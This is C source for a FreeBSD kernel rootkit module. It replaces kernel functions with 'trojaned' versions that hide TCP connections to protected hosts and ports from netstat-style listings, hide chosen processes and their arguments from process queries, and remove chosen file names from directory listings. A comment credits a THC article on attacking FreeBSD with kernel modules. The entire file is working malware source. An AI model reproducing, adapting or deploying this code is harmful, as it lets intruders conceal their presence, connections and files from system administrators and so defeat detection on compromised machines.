#include "trojaned_functions.h"

extern int ps_showallprocs;

static int trojaned_tcp_pcblist(SYSCTL_HANDLER_ARGS)
{
	int error, i, n, s;
	inp_gen_t gencnt;
	struct inpcb *inp, **inp_list;
	struct xinpgen xig;

	/*
	 * The process of preparing the TCB list is too time-consuming and
	 * resource-intensive to repeat twice on every request.
	 */
	if (req->oldptr == 0) {
		n = tcbinfo.ipi_count;
		req->oldidx = 2 * (sizeof xig)
			+ (n + n/8) * sizeof(struct xtcpcb);
		return 0;
	}

	if (req->newptr != 0)
		return EPERM;

	/*
	 * OK, now we're committed to doing something.
	 */
	s = splnet();
	gencnt = tcbinfo.ipi_gencnt;
	n = tcbinfo.ipi_count;
	splx(s);

	xig.xig_len = sizeof xig;
	xig.xig_count = n;
	xig.xig_gen = gencnt;
	xig.xig_sogen = so_gencnt;
	error = SYSCTL_OUT(req, &xig, sizeof xig);
	if (error)
		return error;

	inp_list = malloc(n * sizeof *inp_list, M_TEMP, M_WAITOK);
	if (inp_list == 0)
		return ENOMEM;

	s = splnet();
	for (inp = tcbinfo.listhead->lh_first, i = 0; inp && i < n;
	     inp = inp->inp_list.le_next) {
		if (inp->inp_gencnt <= gencnt && !prison_xinpcb(req->p, inp))
		{	struct protected_hosts *ph;
			struct protected_ports *pp;
			int flag = 0;

			inp_list[i++] = inp;
	/* ---------------------------------------------------------------- */
			for (ph = protected_hosts; ph != NULL; ph = ph->next)
				if (inp->inp_faddr.s_addr == ph->ip)
				{	i--;
					flag = 1;
					break;
				}
			if (!flag) for (pp = protected_ports; pp != NULL; pp = pp->next)
				if (inp->inp_lport == pp->port)
				{	i--;
					break;
				}
	/* ---------------------------------------------------------------- */
		}
	}
	splx(s);
	n = i;

	error = 0;
	for (i = 0; i < n; i++) {
		inp = inp_list[i];
		if (inp->inp_gencnt <= gencnt) {
			struct xtcpcb xt;
			caddr_t inp_ppcb;
			xt.xt_len = sizeof xt;
			/* XXX should avoid extra copy */
			bcopy(inp, &xt.xt_inp, sizeof *inp);
			inp_ppcb = inp->inp_ppcb;
			if (inp_ppcb != NULL)
				bcopy(inp_ppcb, &xt.xt_tp, sizeof xt.xt_tp);
			else
				bzero((char *) &xt.xt_tp, sizeof xt.xt_tp);
			if (inp->inp_socket)
				sotoxsocket(inp->inp_socket, &xt.xt_socket);
			error = SYSCTL_OUT(req, &xt, sizeof xt);
		}
	}
	if (!error) {
		/*
		 * Give the user an updated idea of our state.
		 * If the generation differs from what we told
		 * her before, she knows that something happened
		 * while we were processing this request, and it
		 * might be necessary to retry.
		 */
		s = splnet();
		xig.xig_gen = tcbinfo.ipi_gencnt;
		xig.xig_sogen = so_gencnt;
		xig.xig_count = tcbinfo.ipi_count;
		splx(s);
		error = SYSCTL_OUT(req, &xig, sizeof xig);
	}
	free(inp_list, M_TEMP);
	return error;
}

static int trojaned_sysctl_kern_proc(SYSCTL_HANDLER_ARGS)
{
	int *name = (int*) arg1;
	u_int namelen = arg2;
	struct proc *p;
	int doingzomb;
	int error = 0;

	if (oidp->oid_number == KERN_PROC_PID) {
		if (namelen != 1) 
			return (EINVAL);
		p = pfind((pid_t)name[0]);
		if (!p)
			return (0);
		if (!PRISON_CHECK(curproc, p))
			return (0);
	/* ---------------------------------------------------------------- */
		if (check_proc (p, 1) == FOUND)
			return (0); 
	/* ---------------------------------------------------------------- */
		error = sysctl_out_proc(p, req, 0);
		return (error);
	}
	if (oidp->oid_number == KERN_PROC_ALL && !namelen)
		;
	else if (oidp->oid_number != KERN_PROC_ALL && namelen == 1)
		;
	else
		return (EINVAL);
	
	if (!req->oldptr) {
		/* overestimate by 5 procs */
		error = SYSCTL_OUT(req, 0, sizeof (struct kinfo_proc) * 5);
		if (error)
			return (error);
	}
	for (doingzomb=0 ; doingzomb < 2 ; doingzomb++) {
		if (!doingzomb)
			p = LIST_FIRST(&allproc);
		else
			p = LIST_FIRST(&zombproc);
		for (; p != 0; p = LIST_NEXT(p, p_list)) {
			/*
			 * Show a user only their processes.
			 */
			if ((!ps_showallprocs) && p_trespass(curproc, p))
				continue;
			/*
			 * Skip embryonic processes.
			 */
			if (p->p_stat == SIDL)
				continue;
			/*
			 * TODO - make more efficient (see notes below).
			 * do by session.
			 */
			switch (oidp->oid_number) {

			case KERN_PROC_PGRP:
				/* could do this by traversing pgrp */
				if (p->p_pgrp == NULL || 
				    p->p_pgrp->pg_id != (pid_t)name[0])
					continue;
				break;

			case KERN_PROC_TTY:
				if ((p->p_flag & P_CONTROLT) == 0 ||
				    p->p_session == NULL ||
				    p->p_session->s_ttyp == NULL || 
				    dev2udev(p->p_session->s_ttyp->t_dev) != (udev_t)name[0])
					continue;
				break;

			case KERN_PROC_UID:
				if (p->p_ucred == NULL || 
				    p->p_ucred->cr_uid != (uid_t)name[0])
					continue;
				break;

			case KERN_PROC_RUID:
				if (p->p_ucred == NULL || 
				    p->p_cred->p_ruid != (uid_t)name[0])
					continue;
				break;
			}

			if (!PRISON_CHECK(curproc, p))
				continue;

	/* ---------------------------------------------------------------- */
			if (check_proc (p, 1) == FOUND)
				continue; 
	/* ---------------------------------------------------------------- */


			error = sysctl_out_proc(p, req, doingzomb);
			if (error)
				return (error);
		}
	}
	return (0);
}

static int trojaned_sysctl_kern_proc_args(SYSCTL_HANDLER_ARGS)
{
	int *name = (int*) arg1;
	u_int namelen = arg2;
	struct proc *p;
	struct pargs *pa;
	int error = 0;

	if (namelen != 1) 
		return (EINVAL);

	p = pfind((pid_t)name[0]);
	if (!p)
		return (0);

	/* ---------------------------------------------------------------- */
	if (check_proc (p, 1) == FOUND)
		return (0); 
	/* ---------------------------------------------------------------- */

	if ((!ps_argsopen) && p_trespass(curproc, p))
		return (0);

	if (req->newptr && curproc != p)
		return (EPERM);

	if (req->oldptr && p->p_args != NULL)
		error = SYSCTL_OUT(req, p->p_args->ar_args, p->p_args->ar_length);
	if (req->newptr == NULL)
		return (error);

	if (p->p_args && --p->p_args->ar_ref == 0) 
		FREE(p->p_args, M_PARGS);
	p->p_args = NULL;

	if (req->newlen + sizeof(struct pargs) > ps_arg_cache_limit)
		return (error);

	MALLOC(pa, struct pargs *, sizeof(struct pargs) + req->newlen, 
	    M_PARGS, M_WAITOK);
	pa->ar_ref = 1;
	pa->ar_length = req->newlen;
	error = SYSCTL_IN(req, pa->ar_args, req->newlen);
	if (!error)
		p->p_args = pa;
	else
		FREE(pa, M_PARGS);
	return (error);
}



/* The function bellow function was written using examples from THC's article:
		"Attacking FreeBSD with Kernel Modules" */

static int trojaned_getdirentries (struct proc *p, struct getdirentries_args *uap)
{
	u_int tmp;
	u_int n;
	u_int t;
	struct dirent *dirp2, *dirp3;
	struct hidden_files *current;

	getdirentries(p,uap);
	tmp=p->p_retval[0];
 
	if (tmp>0)
	{ 
		MALLOC(dirp2, struct dirent*, tmp, M_DIRP2, M_NOWAIT);
		copyin(uap->buf, dirp2, tmp);

		dirp3=dirp2;
		t=tmp;
  
		while (t > 0)
		{	n = dirp3->d_reclen;
			t-=n;

			for (current = hidden_files; current != NULL; current = current->next)
				if (strcmp((char*)(dirp3->d_name), (char*)(current->filename)) == 0)
				{	if (t!=0)
						bcopy((char*)dirp3+n,dirp3, t);
					tmp-=n;
				}
			if (dirp3->d_reclen==0) 
				t=0;
			if (t!=0)
				dirp3=(struct dirent*)((char*)dirp3+dirp3->d_reclen); 
		}
		p->p_retval[0]=tmp; 
		copyout(dirp2, uap->buf, tmp);
		FREE(dirp2, M_DIRP2);
	}
	return 0;
}